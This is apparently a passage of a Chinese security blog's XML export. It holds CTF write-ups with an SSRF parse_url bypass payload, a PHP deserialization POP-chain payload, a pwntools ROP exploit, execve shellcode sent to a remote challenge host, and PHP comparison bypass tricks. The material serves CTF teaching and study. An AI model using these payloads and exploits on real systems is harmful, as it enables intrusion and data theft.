123456789101112&lt;?phpsession_save_path('./');session_start();if($_GET['del']) &#123;session_unset();session_destroy();&#125;else&#123;$_SESSION['do']=1;echo(session_id());print_r($_SESSION);&#125;?&gt; 当我们提交cookieHPSESSIONID=/../1.php，相当于删除了此文件。 3. unset()-zend_hash_del_key_or_index漏洞zend_hash_del_key_or_index PHP4小于4.4.3和PHP5小于5.1.3，可能会导致zend_hash_del删除了错误的元素。当PHP的unset()函数被调用时，它会阻止变量被unset。 六、信息泄露phpinfo()如果攻击者可以浏览到程序中调用phpinfo显示的环境信息，会为进一步攻击提供便利。 七、PHP环境1. open_basedir设置open_basedir能限制应用程序能访问的目录，检查有没有对open_basedir进行设置，当然有的通过web服务器来设置，例如：apache的php_admin_value，nginx+fcgi通过conf来控制php设置。 2. allow_url_fopen设置如果allow_url_fopen=ON，那么php可以读取远程文件进行操作，这个容易被攻击者利用。 3. allow_url_include设置如果allow_url_include=ON，那么php可以包含远程文件，会导致严重漏洞。 4. safe_mode_exec_dir设置这个选项能控制php可调用的外部命令的目录，如果PHP程序中有调用外部命令，那么指定外部命令的目录，能控制程序的风险。 5. magic_quote_gpc设置这个选项能转义提交给参数中的特殊字符，建议设置magic_quote_gpc=ON。 6. register_globals设置开启这个选项，将导致php对所有外部提交的变量注册为全局变量，后果相当严重。 7. safe_mode设置safe_mode是PHP的重要安全特性，建议开启。 8. session_use_trans_sid设置如果启用 session.use_trans_sid，会导致 PHP 通过 URL 传递会话 ID，这样一来，攻击者就更容易劫持当前会话，或者欺骗用户使用已被攻击者控制的现有会话。 9. display_errors设置如果启用此选项，PHP将输出所有的错误或警告信息，攻击者能利用这些信息获取web根路径等敏感信息。 10. expose_php设置如果启用 expose_php 选项，那么由 PHP 解释器生成的每个响应都会包含主机系统上所安装的 PHP 版本。了解到远程服务器上运行的 PHP 版本后，攻击者就能针对系统枚举已知的盗取手段，从而大大增加成功发动攻击的机会。]]></content>
      <tags>
        <tag>转载文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP简介]]></title>
    <url>%2F2019%2F02%2F08%2FHTTP%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[内容转自博客园 HTTP简介HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。 HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 主要特点1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。 2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 3.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 4.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。5、支持B/S及C/S模式。 HTTP之URLHTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息 URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成： http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name 从上面的URL可以看出，一个完整的URL包括以下几部分：1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符 2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用 3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口 4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/” 5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名 6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分 7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。 （原文：http://blog.csdn.net/ergouge/article/details/8185219 ） URI和URL的区别URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般由三部组成：①访问资源的命名机制②存放资源的主机名③资源自身的名称，由路径表示，着重强调于资源。 URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：①协议(或称为服务方式)②存有该资源的主机IP地址(有时也包括端口号)③主机资源的具体地址。如目录和文件名等 URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。 在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。相反的是，URL类可以打开一个到达资源的流。 HTTP之请求消息Request客户端发送一个HTTP请求到服务器的请求消息包括以下格式： 请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。 Get请求例子，使用Charles抓取的request： GET /562f25980001b1b106000338.jpg HTTP/1.1 Host img.mukewang.com User-Agent Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 Accept image/webp,image/*,*/*;q=0.8 Referer http://www.imooc.com/ Accept-Encoding gzip, deflate, sdch Accept-Language zh-CN,zh;q=0.8 第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。 第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等 第三部分：空行，请求头部后面的空行是必须的即使第四部分的请求数据为空，也必须有空行。 第四部分：请求数据也叫主体，可以添加任意的其他数据。这个例子的请求数据为空。 POST请求例子，使用Charles抓取的request： POST / HTTP1.1 Host:www.wrox.com User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Content-Type:application/x-www-form-urlencoded Content-Length:40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 第一部分：请求行，第一行明了是post请求，以及http1.1版本。第二部分：请求头部，第二行至第六行。第三部分：空行，第七行的空行。第四部分：请求数据，第八行。 HTTP之响应消息Response一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。 HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 例子 HTTP/1.1 200 OK Date: Fri, 22 May 2009 06:07:21 GMT Content-Type: text/html; charset=UTF-8 &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt; &lt;/html&gt; 第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok） 第二部分：消息报头，用来说明客户端要使用的一些附加信息第二行和第三行为消息报头，Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8 第三部分：空行，消息报头后面的空行是必须的第四部分：响应正文，服务器返回给客户端的文本信息。空行后面的html部分为响应正文。 HTTP之状态码状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别: 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求常见状态码： 200 OK //客户端请求成功 400 Bad Request //客户端请求有语法错误，不能被服务器所理解 401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden //服务器收到请求，但是拒绝提供服务 404 Not Found //请求资源不存在，eg：输入了错误的URL 500 Internal Server Error //服务器发生不可预期的错误 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 更多状态码http://www.runoob.com/http/http-status-codes.html HTTP请求方法根据HTTP标准，HTTP请求可以使用多种请求方法。 HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。 GET 请求指定的页面信息，并返回实体主体。 HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 DELETE 请求服务器删除指定的页面。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS 允许客户端查看服务器的性能。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 HTTP工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求/响应的步骤： 1、客户端连接到Web服务器一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.oakcms.cn。 2、发送HTTP请求通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。 3、服务器接受请求并返回HTTP响应Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。 4、释放连接TCP连接若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求; 5、客户端浏览器解析HTML内容客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接; 3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器; 5、释放 TCP连接; 6、浏览器将该 html 文本并显示内容 GET和POST请求的区别GET请求 GET /books/?sex=man&amp;name=Professional HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Connection: Keep-Alive 注意最后一行是空行 POST请求 POST / HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据 因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变 2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有： GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。 因此对于GET提交时，传输数据就会受到URL长度的 限制。 POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。 3、安全性 POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击 4、Http get,post,soap协议都是在http上运行的 （1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全 （2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。 （3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml 任何数据都可以xml化。 Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. 我们看看GET和POST的区别 GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈ssrf绕过]]></title>
    <url>%2F2019%2F02%2F08%2F%E6%B5%85%E8%B0%88ssrf%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[以hgame2019-week2的web为例 php trick 描述some php tricks URL http://118.24.3.214:3001 基准分数 200 当前分数 200 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 题目提示admin.php，访问一下 让人联想到ssrf 前面的几个if都是正常绕过 12345678910111213141516if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail'); &#125; if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail'); &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); $output = curl_exec($ch); curl_close($ch); if($output === FALSE)&#123; die('step 11 fail'); &#125; else&#123; echo $output; &#125; 这里涉及了parse_url函数的绕过，我们既要访问到本地的admin.php又要保证URL符合www.baidu.com 找到了这篇文章https://www.cnblogs.com/afanti/p/9928371.html 这里可用@进行绕过 http://@127.0.0.1:80@www.baidu.com/admin.php 可以使其访问到admin.php payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 得到了admin的源码 123456789101112131415&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo "sorry,you can't see it";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__);?&gt; 这里源码的意思是这个文件不存在但是还是让我们读取，在这里可以使用php://filter伪协议 最后payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php 得到一串base64编码 PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo= 解密后得到flag]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安恒杯1月赛wp]]></title>
    <url>%2F2019%2F01%2F31%2F%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[webbabygo题目源码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new sec; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } if (isset($_GET[&apos;data&apos;])) { $Input_data = unserialize($_GET[&apos;data&apos;]); echo $Input_data; } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 这个和前几天博客讨论的反序列化pop链构造是一样的，直接放上payload &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new cool(); } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename = &apos;flag.php&apos;; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } $a = new baby(); $a = serialize($a); $a = urlencode($a); echo $a; ?&gt; 得到下面这串字符串： O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D 加入题目进行验证 成功获得flag MISCzhunianjixiang题目是一张图片 用foremost对文件提取，得到两张图片 扫描二维码 提示二维码有古怪 拖到stegsolve后发现flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 2017-pwn1题目复现]]></title>
    <url>%2F2019%2F01%2F30%2FRedHat-2017-pwn1%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[碰到了RedHat 2017 的一道pwn，算是一道很经典的ROP，这里记录一下。 程序只有一个输入点： 检查保护机制： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看见开启了NX 我们将程序拖进ida中查看： int __cdecl main() { int v1; // [esp+18h] [ebp-28h] puts(&quot;pwn test&quot;); fflush(stdout); __isoc99_scanf(&quot;%s&quot;, &amp;v1); printf(&quot;%s&quot;, &amp;v1); return 1; } 程序流程非常简单，可以看到在scanf函数处存在溢出问题，我们可以使其执行system指令，而在程序中可以找到内置的system指令，但是我们无法在程序中获取到/bin/sh字符串，这里再次利用rop技术，调用scanf函数将/bin/sh字符串读取到程序段中，然后再执行system函数 这里介绍一下神器pwntools的ROP模块的用法，例如： rop.call(&apos;read&apos;, (0, elf.bss(0x80))) 其中 (0, elf.bss(0x80)) 是read函数的参数，即使call的函数参数只有一个，我们也要使用一个元组(参数1，)这样 回到本程序，我们来判断需要填充的字节个数： 我们需要填写52个无用字符 下面编写exp: from pwn import * p = process(&apos;./pwn1&apos;) elf = ELF(&apos;./pwn1&apos;) rop = ROP(&apos;./pwn1&apos;) rop.call(0x08048410,(0x08048629, 0x0804A040)) rop.system(0x0804A040) payload = str(rop) p.sendline(52*&apos;a&apos;+payload) p.sendline(&apos;/bin/sh&apos;) p.interactive() 成功获得shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn之shellcode编写]]></title>
    <url>%2F2019%2F01%2F29%2Fpwn%E4%B9%8Bshellcode%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[这里以前几天碰到的hgame2019的一道pwn题目为例 程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错 我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[92]; // [rsp+0h] [rbp-60h] int i; // [rsp+5Ch] [rbp-4h] signal(14, handle); alarm(0xAu); read(0, buf, 0x50uLL); for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; JUMPOUT(*(_QWORD *)&amp;byte_400672); } 改程序直接调用了我们输入的shellcode，但是注意在 for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; 这里他将我们输入的shellcode和i+1进行了异或，所以我们需要将我们的shellcode与i+1进行异或后再发送给程序 关于shellcode，我们不会编写的话可以去公共数据库寻找合适的shellcode http://shell-storm.org/shellcode/ 这里我使用了一位师傅分享的shellcode 我们先将其与i+1进行异或运算 buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) 而后将其整合在最后的exp中： from pwn import * context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;) p = remote(&apos;118.24.3.214&apos;,10000) #p = process(&apos;./babysc&apos;) buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) p.send(m) p.interactive() 执行后成功获得了权限]]></content>
      <tags>
        <tag>pwn，CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中常出现的PHP函数]]></title>
    <url>%2F2019%2F01%2F28%2FCTF%E4%B8%AD%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84PHP%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[文章部分内容来源于网络 strcmpstrcmp(a1，a2)函数用来比较两个字符串是否相等的，比较的是对应字符的ascii码，如果相等返回0，当a1的ascii大于a2的返回小于0，a1的ascii码小于a2的，返回大于0. 但是这个函数是存在漏洞的，我们知道这个函数是用来比较字符串的，但是当我们传入为数组是，那变成字符串和数组进行比较了，因此php在5.2之前，默认返回的-1，5.2版本之后返回0.因此有时我们便可以利用这个漏洞 demo： &lt;?php error_reporting(); $flag=$_GET[&apos;flag&apos;]; if(strcmp(&apos;Waldo_cuit&apos;,$flag)){ echo &apos;NO!&apos;; } else{ echo &apos;YES!&apos;; } ?&gt; eregereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE 字符串对比解析，这里如果$_GET[‘password’]为数组，则返回值为NULL，如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true is_numericdemo: &lt;?php echo is_numeric(233333); # 1 echo is_numeric(&apos;233333&apos;);# 1 echo is_numeric(0x233333);# 1 echo is_numeric(&apos;0x233333&apos;); # 1 echo is_numeric(&apos;233333abc&apos;); # 0 ?&gt; Intval获取变量的整数值，允许以使用特定的进制返回。默认10进制 注:如果参数为整数，则不做任何处理。 我们可以构造字符串绕过： 当取回字符串整数的时候，如果字符串中含有非数字的字符，将会返回第一次出现非数字符的前面的整数。若果没有数字返回0 parse_str与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。 //var.php?var=new $var=&apos;init&apos;; parse_str($_SERVER[&apos;QUERY_STRING&apos;]); print $var; MD5PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 常见字符串： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;) sha1(&apos;aaO8zKZF&apos;) sha1(&apos;aa3OFF9m&apos;) 同时MD5不能处理数组，有以下判断可用数组绕过： if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;])) { echo &quot;yes&quot;; } preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题 &lt;?php $ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过 if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) { die(&apos;error&apos;); } else { echo(&apos;key...&apos;); } ?&gt;]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化pop链的构造]]></title>
    <url>%2F2019%2F01%2F27%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0%2F</url>
